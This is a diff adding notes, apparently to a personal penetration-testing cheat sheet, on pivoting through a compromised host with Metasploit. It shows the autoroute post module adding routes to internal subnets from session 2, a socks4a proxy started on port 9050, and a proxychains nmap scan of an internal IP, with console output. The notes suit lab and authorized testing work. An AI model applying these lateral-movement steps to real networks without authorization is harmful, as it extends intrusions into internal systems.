@@ -5,4 +5,36 @@ msf5 > sessions
 _________________________________________________________________________________________________________________________________________________________________________
 Pivoting with socks proxy
 -------------------------
+msf5 post(multi/manage/autoroute) > set SUBNET 192.167.42.0 
+msf5 post(multi/manage/autoroute) > set session 2
+msf5 post(multi/manage/autoroute) > exploit
+
+[!] SESSION may not be compatible with this module.
+[*] Running module against 192.167.42.3
+[*] Searching for subnets to autoroute.
+[+] Route added to subnet 192.167.42.0/255.255.255.0 from host's routing table. (it creates 2 gateway by only identifying one SUBNET)
+[+] Route added to subnet 192.182.129.0/255.255.255.0 from host's routing table.
+[*] Post module execution completed
+
+#cat /etc/proxychains.conf (to check socks4a port and socks5 port)
+
+Use socks4a module
+-------------------
+msf5 post(multi/manage/autoroute) > use auxiliary/server/socks4a
+msf5 auxiliary(server/socks4a) > set SRVPORT 9050
+SRVPORT => 9050
+msf5 auxiliary(server/socks4a) > exploit
+[*] Auxiliary module running as background job 1.
+
+msf5 auxiliary(server/socks4a) > jobs
+Jobs
+====
+
+  Id  Name                       Payload  Payload opts
+  --  ----                       -------  ------------
+  1   Auxiliary: server/socks4a  
+
+Finally we can scan with proxychains
+
+#proxychains nmap -sT -Pn 192.182.129.3 (internal IP)
 
